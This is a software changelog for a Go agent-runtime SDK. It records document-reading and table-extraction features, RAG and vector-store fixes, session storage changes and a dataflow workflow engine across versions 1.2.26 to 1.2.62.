- Tables that are pictures are read, when the native reader has its models. A table pasted into a text page as a screenshot (a picture at least 240 x 80 pixels) is found by the layout model, cut out of the page image, read by the OCR, and written as a markdown table where it sits in the page. A scanned page is read the same way: the table in it comes out as a table, not as lines of text. A table with text of its own on the page is still filled from that text, not from a picture of it. `PageOptions` (`Tables`, `LargeImage`), `TableStructure.Words` and `TableMarkdown`, in `internal/pdftext`.
- Tables with a single rule, under their column titles, are read from the rulings alone. An invoice's lines (a row of underlined titles, then the items, no rule above or below) were left as a run of text unless the models were there; a row of at least three chunks just over a rule, with lines under it that run on without a gap, is now a table candidate, judged by the same guards as any ruled block (columns that line up, no paragraph cells, regular rows). On the test papers, the TableFormer paper goes from 1 table to the 4 Docling finds in its pages 4 and 7, and 60 pages of prose, letters and CVs gain no false table.

### Fixed

- The size of the pictures of a page was never read (pdfcpu leaves it empty when it extracts them raw); it is now read from each picture's header.

## [1.2.62] - 2026-10-04

### Added

- Tables with no ruling lines are read too, when the native reader has its models (`layout.ort` and `tsr.ort`, already part of the nativedoc models). For a page whose text looks columnar (several lines with several chunks lined up in columns; a page of prose is never sent to the models) the page is rendered, the layout model finds where the tables are, the table-structure model reads their rows, columns and header, and the cells are filled from the page's own text, which is exact where an OCR of the picture is not. The columns also come from the gaps in the text, so a column the model merged with its neighbour is found again. The reader is asked through the new optional `pdfsmart.TableFinder` interface (the native `Converter` implements it, and so a host that already passes it as its document reader gets this with no other change); without the models, or when they fail, a page reads as before. Tables that are pictures inside the PDF are not read (there is no text to fill them with).
- `PageMarkdownWith` and `TableStructure` in `internal/pdftext`, and `pdfsmart.TableFinder` / `pdfsmart.TableStructure` in the public package: a host with its own layout model implements `TableFinder`, and `pdfsmart` does the rest (`internal/pdftext` is not importable from outside, so the first two are not part of the SDK).

### Changed

- In a ruled table whose rules sit between groups of rows rather than between every row, each line with numbers is a row of its own: a line is joined to the one above it only when it carries on its words (the second line of a wrapped label) or fills columns the row above leaves empty (a heading drawn lower than its neighbours). Two-line headers ("TEDS" over "Complex") are joined into one header row.

## [1.2.61] - 2026-10-03

### Added

- Tables in PDFs are read as tables, in pure Go, from the lines the page draws. The page's rulings (stroked lines and rectangle edges, and filled bars thin enough to be rules) are read from the content stream and two kinds of table are recognised: a grid (horizontal and vertical rules that cross; merged cells are resolved, and a header that spans columns or rows is joined into one header row) and a ruled block (a top rule, a header rule and a bottom rule, with no vertical lines, as in most papers; its columns are the white gaps in the text, taken from the body so a header wider than its column cannot hide them). A table stays where it was in the reading order, its text is not repeated outside it, and its cells come out as markdown. On the documents tried (arXiv papers, a technical report, an IBM Redbook) it finds the same tables as Docling's TableFormer page by page. A table with no rules at all is not found: it is left as text, because a borderless table and two columns of prose cannot be told apart reliably from the text alone.
- What is not a table is rejected: the header and footer rules of a page, a cover page of headlines and captions (mixed sizes, paragraph cells), a boxed listing (monospaced font, brackets and operators as cells), and two rules with a caption or a sentence between them (a caption splits one set of equal rules into the tables above and below it).

## [1.2.60] - 2026-10-03

### Changed

- Office files are read for what they say, not just their words. **DOCX**: headings are found from the style's outline level, so they work in every language (a French Word names its style "Titre 1"); bulleted and numbered lists keep their depth and the numbers Word writes from the list ("Article 3", "1.2", "(a)"), including numbered headings; tables resolve merged cells (a cell that spans rows or columns repeats its value, several header rows become one: "2024 / Sales"); hyperlinks, footnotes, the description of pictures, text boxes and code in a monospaced font are kept; headers and footers and tracked deletions are not. **PPTX**: nested bullets and numbered steps, tables with merges, charts as a table of the numbers behind them, SmartArt text, picture descriptions, groups, speaker notes and hidden slides; slide numbers, dates and footers are left out. **XLSX**: values as the workbook shows them, merged cells, a sheet with several blocks of data becomes several tables, a title line above a table becomes its caption, hidden sheets are skipped, and a sheet is cut at 2000 rows with a note saying how many were left.
- Tables, whatever the file, are written the same way (`internal/mdtable`): markdown tables with empty rows and columns dropped, cells on one line (`<br>`, escaped pipes), and a table with one column written as lines.

### Added

- HTML pages are converted to markdown by the default reader (`.html`, `.htm`, `.xhtml`): headings, nested lists, tables with merged cells and captions, fenced code with its language, quotations, links, picture descriptions and definition lists, without scripts, styles, navigation, hidden elements and the usual site chrome (edit links, language menus, breadcrumbs). It honours the page's declared encoding. The Read tool is unchanged: it shows an HTML file as source.

### Removed

- The managed docling-serve: `seshat setup`, the `DOCUMENT_READER_URL=docling:auto` selector and the installer's Python step are gone, and so is `internal/python`. Nothing installs a Python environment for you any more. The built-in reader handles DOCX, PPTX, XLSX and PDFs with a text layer; for scans and complex layouts, run a document-reader service (seshat-intelligence) yourself and point `DOCUMENT_READER_URL` at it. `seshat doctor` now reports the built-in reader when no service is configured instead of warning about a missing venv.

## [1.2.59] - 2026-10-03

### Changed

- A session has one directory, `workspaces/{id}/`, instead of two. Plans, pastes, screenshots, tool output and the session log used to live in `sessions/{id}/` next to the `workspaces/{id}/` that hosts such as seshat-backend use for the files of a session; they are now in the same place, so the files a user attaches and the files the agent writes are together and deleting a session removes them all. `runtimepath.SessionDir` and `SessionsDir` now point there, and the artifact store keys use the `workspaces/` prefix.
- The permissions a session has been granted ("always allow this tool") moved from `sessions/{id}/permissions.json` to `data/permissions/{id}.json`. They stay outside the session directory on purpose: the agent can write inside it, and a grant it could edit is a grant it could give itself.

### Added

- `runtimepath.MigrateLegacySessionDirs` moves what older versions wrote under `sessions/{id}/` to the new places, never overwriting. The CLI runs it at start; hosts that embed the SDK call it once at start.
- `runtimepath.RemoveSessionData` removes a session's directory and its grants. `Client.DeleteSession` calls it, so deleting a session no longer leaves its plans and grants behind: the old layout left a `sessions/{id}/` folder for every session that had ever used plan mode or asked for a permission.

## [1.2.58] - 2026-10-03

### Changed
- `read_file` reads a PDF page by page, with a `--- page N ---` marker before each page. With no `pages` it reads from the start; with `pages` ("3", "10-20", "5-") those pages. A read is bounded by cost, not page count: it stops at a page boundary after 120,000 characters, or after sending 20 pages with no text layer to the document reader, and says which page to continue from. The result names the pages that hold images or have no readable text.
- Only the pages a read returns are read, in batches of ten, and each is remembered per file (path, size, modification time), so the first read of a long document is quick and a page an engine had to read is never paid for twice.
- `internal/pdfsmart` gains `ReadPages` (`Convert` for chosen pages, with options to leave pages with an image but good text to the native reader and to bound engine calls) and `PageCount`. `Convert` behaves as before.
- Native PDF pages are read as markdown, not flat text. Typesetting gives the structure: a line much bigger than the body is a heading (`#` to `###`), lines in a monospace font are a fenced code block with their indentation and spacing restored column by column, bullets and numbers are list items, wrapped lines are one paragraph (a hyphen added at a line end is undone), dot leaders become "…", and a table of contents keeps one entry per line. Formulas are recognised by their math font and position: inline ones become `$...$` with `^{}` and `_{}`, display ones become `$$...$$` with `rac{}{}`, `egin{cases}` and sums with their bounds, read in drawing order because the x the PDF library gives is unreliable for many fonts. Symbols stay as the PDF has them (Unicode math letters). Fraction bars, roots and matrices are not drawn as glyphs and are not recognised; a formula that needs them comes out as its parts in reading order. Tables are not detected.

### Fixed
- Native PDF text had no spaces between words on many PDFs (LaTeX output among them), which draw each word separately and leave the space as a gap: a paragraph came back as one unbroken word, and line breaks were lost. Text is now rebuilt from the position of each glyph, restoring word spaces and lines, and an accent drawn as its own glyph is joined to its letter. This affects every reader built on it (`read_file`, `pdfsmart`, `pkg/documentreading`, `pkg/pdftext`).
- The `pages` parameter of `read_file` was ignored on every text path (a pre-converted `.md` next to the file, native text, and the document reader), so only the raw-PDF fallback honoured it and an agent could not read a page range as text.

### Removed
- `read_file` no longer serves a pre-converted `<name>.md` next to a PDF, since that text cannot be split by page. DOCX, PPTX and XLSX still use it for now.
- The 50-pages-per-request error of `read_file` for a PDF: the size limits above bound a read instead.

## [1.2.57] - 2026-10-02

### Added
- `pkg/documentreading`: the engine's default document reader as a public package. `Convert` and `ConvertBytes` turn a file into markdown cheapest path first: DOCX, PPTX and XLSX natively, PDFs page by page (only pages with an image, almost no text, or garbled text go to an external converter), then an optional external converter for scans, audio and images, with garbled-output detection. A host with no converter configured still reads every native format. It was previously internal to SeshatOS's backend, which meant a server could not reuse it.

### Documentation
- `SECURITY.md` and `CODE_OF_CONDUCT.md` now name a contact address.

### Removed
- `cmd/slack-bot`, `cmd/automation` and `cmd/automation-server` (with `Dockerfile.automation` and their Makefile targets): development and test programs that no embedder used. The `pkg/automation` library and the automation agent tools are unchanged.

## [1.2.56] - 2026-10-02

### Fixed
- Session title generation no longer returns an empty title with reasoning models: the title request now has a 512-token output budget (was 50, which a model's hidden reasoning could consume entirely), and a leading `</think>` block is stripped from the result.

## [1.2.55] - 2026-09-30

### Fixed
- `render_document_page` (added in 1.2.54) now attaches the rendered page as a genuine image content block in a follow-up message instead of inlining it as a base64 data URI inside the tool result's text. The old form was never reconstructed into a real image by any provider adapter — the model received an opaque base64 blob instead of a viewable page — and was also liable to be corrupted by `MicroCompactor`'s character-based tool-result trimming on longer sessions. Renders over 8 MiB are now reported instead of attached, rather than silently ballooning the request.

### Documentation
- Added the `internal/tools/files/documentreader` tools (`convert_document`, `read_document_url`, `render_document_page`) to `docs/tools.md` — missing since `convert_document`/`read_document_url` were introduced, and never added for `render_document_page` in 1.2.54.

## [1.2.54] - 2026-09-28

### Added
- `render_document_page`: a new built-in document-reader tool that renders a specific PDF page to an image data URI, so multimodal-capable agents can inspect diagrams, figures, scans, or visually dense pages instead of relying only on extracted markdown.
- Local automatic session-title generation via `TitleGenerator`/`LocalTitleConfig`, with a no-server GGUF/Hugging Face path backed by a `llama.cpp`-compatible executable. Hosts can now dedicate a tiny local model to title generation while keeping the main chat model unchanged.
- Document-read metadata now carries per-page visual hints (`visual_pages`) when PDFs contain embedded images/visual content, and `read_file` surfaces that metadata from sidecar caches.

### Changed
- Session title generation now prefers an injected local title generator, then falls back to the configured title provider/model, then to the main chat model.
- `pdfsmart` page results now retain embedded-image detection metadata so downstream readers can decide when visual inspection may be useful.

## [1.2.53] - 2026-09-26

### Added
- `internal/documentreader`/`pkg/documentreader`: a neutral document-reader abstraction plus `GenericClient`, a configurable client for any document-intelligence HTTP server that accepts a multipart file upload and returns JSON (the shape docling-serve, seshat-intelligence, marker-style services, and similar backends can all share). Every protocol detail (paths, the multipart file field name, response parsing via `ConvertParser`/`ChunkParser`) is supplied by the caller through `GenericConfig`, so a concrete backend's own adapter can live downstream without renaming Seshat internals again. Validated against a real, running seshat-intelligence instance, including live conversion and hybrid-chunk round trips.

### Changed
- Document conversion configuration moved from `DoclingURL`/`docling_url` to `DocumentReaderURL`/`document_reader_url`; callers can still inject a custom `documentreader.Converter` directly.
- The TUI no longer starts a managed document-conversion service by default. It only starts the bundled docling-serve adapter when `DocumentReaderURL` is explicitly set to `docling:auto`, then replaces that sentinel with the managed local base URL.
- The public RAG document-aware chunker is now `HybridDocumentChunker`/`NewHybridDocumentChunkerForProfile`, with neutral metadata (`chunker=document_hybrid`, `document_reader_*`) instead of docling-shaped names.
- The explicit document conversion tool is now `convert_document` instead of `docling_convert`.
- The concrete docling-serve HTTP adapter remains internal implementation detail under `internal/documentreader`; the public package now exposes only neutral document-reader interfaces, result types, and the generic HTTP client.

### Removed
- Removed the public `pkg/docling` and `pkg/python` facades, plus internal/tool packages named `docling`.
- Removed the old exported names `DoclingURL`, `DoclingChunker`, `NewDoclingChunker*`, `DoclingChunkOptionsForProfile`, `FileTypeDocling`, and `DoclingFileResult`.

## [1.2.52] - 2026-09-25

### Added
- `internal/nativedoc`, `internal/pdfsmart`, `internal/rag` (re-exported via `pkg/nativedoc`, `pkg/pdfsmart`, `pkg/rag`, `pkg/model`): the document-intelligence roadmap's Phases 1-4 - native (Go/CGO, no external service) PDF/DOCX/XLSX parsing with OCR/layout/table-structure via ported-and-adapted RAGFlow components (opt-in behind the `nativedoc` build tag; Windows/Linux/macOS all validated), opt-in chunk-level LLM enrichment (`rag.Enricher`/`rag.SetEnricher` - synthetic questions per chunk folded into embedded text only, never into stored/returned chunk text), an opt-in vision-LLM fallback for `pdfsmart.Convert` (`pdfsmart.VisionFallback`) for a page that still has no usable text after native extraction and docling, and two new chunk profiles/chunkers (`rag.TableChunker`/`ChunkProfileTable` - keeps GFM table rows intact, repeating the header row on an oversized split instead of a generic splitter cutting through a table; `rag.QAChunker`/`ChunkProfileQA` - one chunk per detected Q/A pair, from either `Q:`/`A:` labels or Markdown headings ending in `?`). New public packages: `pkg/nativedoc`, `internal/rag/enricher`/`pkg/rag/enricher`, `internal/pdfsmart/vision`/`pkg/pdfsmart/vision`, `pkg/model` (a small facade over `internal/model`'s LLM capability registry, needed so `pdfsmart/vision.Config.Registry` isn't an internal type leaking into a public signature). See `docs/issues/document-intelligence-roadmap.md` for the full design log.
- `pkg/connectors`: Google Drive, SharePoint, OneDrive, S3-compatible, Azure Blob, Confluence, and Notion Discover/Sync connectors, moved here from seshat-ai's private `seshat-core/connectors` module - tenant-agnostic mechanism (no organization/user/ACL concepts), previously duplicated across seshat-ai's desktop and server products before being extracted into a shared internal module; now a public capability of the runtime itself, matching how the rest of `pkg/` already separates mechanism (here) from product policy (seshat-ai). Same code, same tests, only the import path changes for existing consumers.
- `pkg/gmail`: Gmail API client (messages, threads, drafts, send), moved here from seshat-ai's private `seshat-core/gmail` module for the same reason as `pkg/connectors` above.
- `pkg/msgraph`: Microsoft Graph API client (mail, Teams), moved here from seshat-ai's private `seshat-core/msgraph` module for the same reason as `pkg/connectors` above.
- `internal/types` (re-exported via `pkg/types`): `WithPromptFn`/`PromptFnFromContext` and `WithWebSearchRunner`/`WebSearchRunnerFromContext` carry the current turn's interactive-prompt bridge and web-search runner on `context.Context`, resolved per-call by `ask_user_question`, the permission integrator, and `web_search` instead of a client/tool-instance-wide mutable field set via `Client.SetPromptFn`/`SetWebSearchRunner`. Those setters still work as a fallback for callers that never share a client across concurrent turns; a host that caches/reuses one `*sdk.Client` across turns must use the context path instead, or two concurrent turns sharing that client could race on the same routing state (one turn's `ask_user_question` prompt or web search getting misrouted to another's).
- `internal/tools/system/mcp`: a wrapped tool/resource/prompt call now checks its MCP connection's health before use and attempts one reconnect (rebuilding the client from the original `ServerConfig`) before failing, instead of staying broken for the rest of the connection's lifetime after a single transient error.
- `internal/types`: `RuntimeEventTypeStage` (`turn.stage`) reports named pre-generation setup phases (loading tools, resuming a session, searching knowledge) so a client can show what's happening instead of a generic spinner during the otherwise-silent gap before the first response chunk.
- `internal/types`: `RuntimeEventTypeCompaction` (`context.compacted`) reports before/after token counts whenever a turn triggers auto-compaction - previously computed internally and discarded, with no way for a host to notify the user that anything happened.
- `pkg/types`: `APIRequest`, `APIResponse`, `UserMessage`, and `pkg/providers.NewClientWithConfig` expose the SDK's one-shot (non-session) provider call path publicly, for hosts that need a single LLM call without a full agentic session (e.g. drafting structured content from a natural-language request).
- `internal/rag`: `HeadingChunker` gives the `structured` chunk profile real structural awareness - it recognizes Markdown headings, numbered outline notation (`1.2.3`), and EN/FR legal-structural keywords (Part/Chapter/Section/Article/Clause, Partie/Chapitre/Article/Clause/Annexe), chunks along whichever hierarchy it finds, and attaches the full ancestor-heading path to each chunk (both in its text and in `Metadata["heading_path"]`) - instead of the profile being only a token-size preset with no structural behavior. `NewDoclingChunkerForProfile` now uses it as the `structured` profile's fallback (when docling-serve is unavailable/fails) instead of plain paragraph splitting; every other profile is unaffected. A document with no recognizable heading falls back to today's plain paragraph chunking exactly.

### Changed
- `pkg/pdfsmart`/`internal/pdfsmart`: `Convert` gains a fourth parameter, `vision VisionFallback` - breaking change to `pkg/pdfsmart.Convert`'s external callers (seshat-backend). Bundled into one struct (`VisionFallback{Renderer, Transcriber}`) rather than two more positional parameters so a future fallback stage doesn't force another breaking signature change; `VisionFallback{}` (zero value) disables the stage entirely, matching how a nil docling client already disabled the docling stage.
- `internal/rag`: `Service.DeleteFileChunks` no longer takes a `(fromChunk, toChunk)` range - it now takes a single `keepBelow int` and lists every record actually present in the namespace, deleting whichever ones still carry the given `artifact_key` at or past that position. The old range-based version guessed an upper bound (a fixed ceiling past the new chunk count) rather than checking what was really there - see the matching Fixed entry below for why that silently lost data on large files.
- `internal/memory`: `Manager` no longer holds a single implicit "currently loaded project" - `project *ProjectMemory` became `projects map[string]*ProjectMemory`, keyed by the new `ProjectID(path)`. Every project-scoped method (`GetProject`, `SaveProject`, `Context`, `StoreEntry`, `LearnPreference`/`LearnInstruction`, `LearnToolUsage`, `GetToolUsagePatterns`, `Search`) now takes an explicit `projectID` parameter instead of relying on whichever project was loaded most recently. `LoadProject`/`LoadAll` return that ID. Breaking change to `internal/memory`'s API (not exported via `pkg/`, so no public SDK impact) - fixes a real bug, not just an API cleanup: a single `Engine` reused across sessions for different projects used to silently clobber one session's project memory with another's the moment a second `LoadProject` call landed, since both wrote through the same field.
- `internal/memory`: project IDs are now `ProjectID(path)`, a SHA256 hash of the canonical absolute path - replaces the old `getProjectRootID`, which returned `filepath.Base(projectPath)` unconditionally for any git-tracked project (the common case), so two different repositories sharing a directory name (`/home/a/backend`, `/home/b/backend`) collided on the same memory file. This changes existing users' project-memory filenames on upgrade (old files are orphaned, not migrated) - the same trade-off the previous non-git fallback (an `fnv32` path hash) already made.
- `pkg/sdk`: `RunResult`/`SessionResponse` (and the engine's internal `MutableState`) now carry the full auto-compaction result (`CompactPreTokens`/`CompactPostTokens`), not just a `Compacted` bool, threaded through to the new `context.compacted` runtime event above.
- `pkg/dataflow`: `AgentCaller.Ask` gains a fourth parameter, `tools []string` - a list of tool names to scope an "agent" node's turn to, empty for "use the resolved agent's own tools" (unchanged behavior). This is a breaking change to a public interface; every `AgentCaller` implementation needs updating to the new signature. The built-in `agentNode` gained a matching optional `tools` property (comma-separated, parsed via the new `StringListParam` helper). Actually enforcing a tools override end-to-end (resolving a tool name to a registrable `sdk.Tool`) is not wired into `internal/automation`'s `sessionAgentCaller` yet - it fails loudly with a clear error if a graph sets `tools`, rather than silently ignoring the request.
- `pkg/dataflow`: `Node` gains a `Tools []string` field (agent nodes only) naming other nodes in the same graph an agent's LLM may call as tools during its turn, in addition to (never instead of) whatever it's wired to via `Connections` - dual-use, not exclusive. A node referenced only this way (no real `Connections` of its own) is no longer scheduled eagerly by the engine; it stays dormant until actually invoked (see the new `BuildAgentTools`/`ToolSpec`). `AgentCaller.Ask` gains a fifth parameter, `graphTools []ToolSpec`, for this - another breaking interface change, same reasoning as `tools` above. `internal/automation`'s `sessionAgentCaller` wires this up for real (register/unregister the resolved tools on the session for just that one turn); every other `AgentCaller` implementation needs updating to the new signature.
- `pkg/dataflow`: the catch-all `agent` node type splits into three - `agent` (now pure identity: just an `agent` slug parameter, a no-op `Execute`), `query` (the actual task - `prompt`/`tools` parameters moved here, plus a new `Agent` field referencing the `agent` node providing its persona), and `tools` (a reusable, individually-toggleable group of capability nodes - its own `Tools` field lists members, a new `disabled` parameter temporarily excludes some without removing the wiring). `BuildAgentTools` is renamed `ResolveTools` and now expands a `tools`-type target recursively, so several `query` nodes can share one capability group. `Node.Tools` ownership widens from "agent only" to "query or tools"; `Validate` gains matching checks (a `query` node requires a valid `Agent` reference; `Tools` may no longer target a `query` node, may target a `tools` node). Breaking change to the old single-node shape - no `AgentCaller` interface change, since only *which* node type calls `Ask` moved, not the signature.

### Fixed
- `internal/execution`: `formatAndTruncateResult` allocated a fresh `ResultMetadata` on every truncation, silently discarding whatever the tool itself had already set there - bash's `ExecutionDuration` and `Additional` (`exit_code`/`stdout`/`stderr`/`sandboxed`/etc.) vanished the moment a long command's output got truncated, along with any other tool's custom metadata. Now preserved; only `ContentReplacement` is added/updated.
- `internal/execution`: `formatAndTruncateResult` truncated on a raw byte offset (`content[:maxSize]`), which can land inside a multi-byte UTF-8 rune (non-ASCII content: French/Arabic/Chinese/Japanese, emoji) and produce invalid UTF-8 in both the truncated content and its preview. Now cuts at the nearest valid rune boundary at or before the limit.
- `internal/memory`: `FileStore`'s three save paths (`SaveProjectMemory`/`SaveUserMemory`/`SaveCrossSession`) wrote directly to the destination file via `os.WriteFile` - a crash mid-write (power loss, OOM kill) could leave a truncated, unparseable JSON file behind, losing whatever was previously saved. They now write to a temp file in the same directory, `fsync`, then atomically rename into place. Memory directories/files also move from world-readable `0755`/`0644` to `0700`/`0600` - this content can include personal preferences, learned instructions, and conversation summaries.
- `internal/rag`: `Service.DeleteFileChunks` capped its stale-chunk search at a fixed ceiling past the new chunk count (500 for a shrunk re-ingest, 2000 for `rag_delete`'s whole-file case) instead of checking how many chunks actually existed - a file that shrank by more than the ceiling, or a whole-file delete on a file larger than 2000 chunks, left everything beyond that ceiling as orphaned vectors with no way to ever reach them again, still returned as phantom results by future searches. Now lists what's actually in the namespace and deletes exactly the matching stale chunks, regardless of count.
- `internal/vector`: `OpenSearchStore.DeleteKeys` issued one HTTP `DELETE` request per key instead of using the `_bulk` API `Upsert` already uses - painfully slow for the thousands of keys a stale-chunk cleanup or whole-file delete can involve, and a good way to blow past a caller's timeout partway through a large batch. Now batches through `_bulk` in `BulkSize`-sized groups, same as indexing.
- `internal/vector`: `OpenSearchStore.ensureIndex` raced under concurrent use - two ingests both seeing a not-yet-existing namespace would both call `Indices.Create`, and the loser got `resource_already_exists_exception` back as a hard failure instead of the idempotent success it actually is. Now tolerated.
- `internal/vector`: `OpenSearchStore.Get(ctx, namespace, nil)` ("all records in the namespace," a contract the `Store` interface explicitly documents) capped itself at a single `size: 10000` query - a namespace with more chunks than that silently returned only the first 10,000, with no error to signal the truncation. Now paginates with `search_after` until a page comes back short, so it actually returns everything.
- `internal/memory`: `Manager.DeleteEntry` only removed an entry from the searchable catalog, never from the underlying `ProjectMemory`/`UserMemory` entry map it was actually persisted in - so the very next `rebuildCatalog` (triggered by any `Load*` call, e.g. a process restart) silently resurrected it from that map. Now removes from both, and persists the removal.
- `internal/engine`: `Session.SubmitMessage`/`SubmitMessageWithContent` had no guard against a second concurrent call on the same session - only `cancelFn` was mutex-protected, so two turns submitted in parallel would both mutate `Session.state.Messages`/`Metadata` and persist independently (a lost-update race). A session now rejects a `SubmitMessage` while one is already in progress (`"session is busy"`) or after `Close()` (`"session is closed"`) instead of racing. `Close()` is now idempotent and, if a turn is running, cancels it before tearing down the event queues underneath it, instead of potentially doing both at once.
- `internal/rag`: `Service.Search`'s reranking step fully replaced vector/BM25 order and score with whatever the configured `Reranker` returned, trusting its raw score as-is (a provider returning unbounded logits instead of a calibrated [0,1] relevance score would corrupt any downstream comparison) - a confidently-wrong rerank call could bury a strong retrieval match with no way to hedge against it. `reranker.NormalizeScores` now min-max scales an out-of-range score batch into [0,1] (a no-op when already in range), and `Search` blends the normalized rerank score with each result's original retrieval score instead of overriding it - `SearchRequest.RerankWeight` (0-1, defaulting to `Service`'s configured weight, itself defaulting to 0.7) controls the blend ratio; `Service.SetRerankWeight` and the `RAG_RERANK_WEIGHT` environment variable (`cmd/cli`) adjust the default.
- `internal/tools/system/skills`: the multi-user skills directory (`skills/users/`) was missing from the "reserved" exclusion list used when scanning the skills root for extra collections, so every tool-registry build recursively loaded every *other* user's skills alongside the current user's own - unbounded, and duplicating work the per-user loader already did correctly. Measured ~980ms wasted per turn on a dev machine with hundreds of provisioned users; now ~0.5ms.
- `internal/sandbox`: `NewExecutor` rebuilt a fresh `*DockerExecutor` (re-reaping orphan containers via `docker ps -a`) on every call instead of the "once at process startup" its own docs assumed - now cached process-wide per `DockerExecutorConfig`. `Healthy` also caches its `docker version` probe result (10 minutes) instead of re-shelling out on every call. Together with the skills fix above, a host that rebuilds its `*sdk.Client` per turn (the common case before client-level caching) no longer pays ~1.9s of avoidable per-turn overhead for these two alone.
- `pkg/dataflow`: the `agent` node's own `agent` parameter is optional again (it was briefly made required in the agent/query/tools split above, caught by a downstream consumer's own built-in-template test failing immediately after upgrading) - a `query` node must always reference an `agent` node (Validate still enforces that structural link), but the referenced `agent` node itself can exist with no persona picked yet, same as before the split: empty means "use the job's own default agent." Fixes a template or mid-edit graph with an unconfigured identity being rejected outright instead of only once actually run.
- `internal/vector`: `OpenSearchStore.DeleteKeys` treated a 404 "not_found" delete response (a key already removed, or never written) as a hard failure instead of the silent no-op every other `VectorStore` backend gives it (Qdrant/Chroma explicitly swallow their own not-found shape; pgvector/sqlite/hnsw/memory are naturally idempotent) and that `Service.DeleteFileChunks`'s own doc comment assumes. In practice this permanently failed re-ingesting any file whose stale-chunk cleanup range included an already-deleted chunk - the ingest job would exhaust all retries and stay `failed` forever, since the same benign 404 recurred on every attempt.

## [1.2.38] - 2026-09-09

### Fixed
- `internal/providers`: tunes the Z.ai request timeout behavior and provider tests so long-running model calls have a better chance to complete without weakening the shared provider client path.

### Added
- `pkg/types`: exposes model context-window metadata through the public types surface, with coverage for the new API contract.

## [1.2.37] - 2026-09-07

### Added
- `pkg/dataflow`: node execution can now retry individual node failures with per-node retry configuration.
- `pkg/dataflow`: nodes can opt into `OnError` continuation behavior so a graph can continue after selected failures instead of always aborting the whole run.

## [1.2.36] - 2026-09-07

### Added
- `pkg/dataflow`: promotes `$vars` expression binding for dataflow `Variables` onto the normal `dev` -> `main` release path.

### Notes
- `v1.2.35` was tagged on an intermediate equivalent commit that is not on the current `main` ancestry; `v1.2.36` is the mainline release carrying the same `$vars` feature.

## [1.2.35] - 2026-09-07

### Added
- `pkg/dataflow`: adds `$vars` expression binding so graph expressions can read workflow-level variables alongside item JSON.

### Notes
- This tag was cut before the final `dev` -> `main` promotion; consumers should prefer `v1.2.36` or newer.

## [1.2.34] - 2026-09-07

### Added
- `internal/vector`: adds an OpenSearch vector store implementation, integration coverage, and configuration plumbing.
- `internal/rag`: adds Docling-based chunking and chunk-cache support for richer RAG ingestion.
- `pkg/docling`, `pkg/rag`, `pkg/vector`, and `pkg/config`: expose the new RAG/vector configuration and Docling chunking surfaces to embedders.

### Changed
- RAG documentation and database-schema notes now describe the new chunking/vector-store behavior.

## [1.2.33] - 2026-09-05

### Added
- `pkg/dataflow`: adds pinned node data so tests and authoring tools can freeze a node output and replay downstream graph behavior deterministically.

## [1.2.32] - 2026-09-05

### Added
- `pkg/dataflow`: adds expression resolution for dataflow nodes, enabling node parameters to be computed from incoming item data during execution.

## [1.2.31] - 2026-09-05

### Added
- `pkg/dataflow`: tracks per-item provenance and per-port outputs so graph consumers can inspect where each item came from and which branch produced it.

## [1.2.30] - 2026-09-05

### Added
- `pkg/dataflow/nodes`: `webhook_trigger` gains `responseMode` support for immediate responses or delayed responses after workflow completion.

## [1.2.29] - 2026-09-05

### Added
- `pkg/dataflow/nodes`: adds a `webhook_trigger` node type for HTTP-triggered dataflow workflows.

## [1.2.28] - 2026-09-05

### Added
- `pkg/dataflow/nodes`: adds a `schedule_trigger` node type for time-based dataflow workflow starts.
- `pkg/dataflow`: `NodeDescription` gains `IsTrigger` so authoring UIs and runtimes can identify trigger nodes explicitly.

## [1.2.27] — 2026-09-03

### Added
- `pkg/dataflow`: `NodeDescription.Properties []NodeProperty` — a small, flat parameter schema (string/text/number/boolean/options/json field types, a single-condition `DisplayIf` for conditional visibility) so a consuming authoring UI can render real per-field forms instead of falling back to a raw-JSON textarea for every node type. Populated for `http_request`, `filter`, `if`, `switch` (`casesOrder`/`cases` stay JSON — a paired repeatable structure the flat model doesn't fit), `wait`, `agent`, and all six database node types. Left empty, deliberately, on `subworkflow` (a nested `workflow.Definition` isn't representable as flat fields) and `set` (its one real parameter is an arbitrary-keyed map, structurally like a fixed collection this system doesn't support). Additive and `omitempty` — any node type without `Properties` simply has none, the correct signal to fall back to raw JSON.
- `pkg/dataflow`: `NodePropertyType` gains `"secretRef"`, and the 5 `*SecretRef` parameters across the database node types (`dsnSecretRef`, `uriSecretRef`, `addrSecretRef`, `passwordSecretRef`, `baseURLSecretRef`) are now typed with it instead of plain `string` — gives a consuming UI a real signal to render a secret picker instead of pattern-matching on the field name. Metadata/JSON-tag only, no `Execute`/`ValidateParameters` logic touched.

## [1.2.26] — 2026-09-02

### Added
- `pkg/dataflow`: a new deterministic node-graph workflow engine — level-based topological execution, cycle detection, port-based data routing for conditional branching (`if`/`switch`). Complements `pkg/workflow` (a multi-agent DAG where every node costs an LLM call) rather than replacing it: two built-in node types, `agent` (a single scoped agent turn) and `subworkflow` (delegates to `pkg/workflow.Run`), let a deterministic graph invoke a multi-agent chain for the one step that genuinely needs judgment, without either engine reimplementing the other's execution model. `Runtime` carries per-run dependencies (secrets, agent/subworkflow callers) injected by the caller rather than owned by this package, so it never stores a credential or holds an `sdk.Client` directly.
- `pkg/dataflow/expr`: a `goja` runtime pool with a compiled-bytecode cache for `$json`-bound boolean/value expressions — same `"$"`-prefixed convention `internal/inbox/event_filter.go` already established in seshat-ai, so a graph's `filter`/`if`/`switch`/`set` nodes and an inbox event filter read the same way regardless of which evaluates them. Unlike a one-VM-per-call check (fine for a single message), a graph node may evaluate the same expression against many items in one run, so runtimes and compiled programs are reused across calls.
- `pkg/dataflow/nodes`: `http_request` (with an SSRF guard blocking private/link-local/cloud-metadata addresses), `filter`, `if`, `switch`, `set`, `merge`, `wait` — the node types a graph needs regardless of tenant/product, no credentials involved.
- `pkg/dataflow/nodes/database`: `postgres`, `mysql`, `sqlite` (shared `database/sql` executor), `redis`, `mongodb`, `elasticsearch` — credential-resolving nodes for a graph step that reads/writes a database directly. `sqlite` uses `modernc.org/sqlite` (pure Go, no cgo); production code deliberately doesn't blank-import it itself (see the package doc comment) since the Go sqlite ecosystem has multiple packages that each self-register under the driver name `"sqlite"`, and a consumer already using `glebarez/sqlite` for its own storage would panic at init time on a second registration.
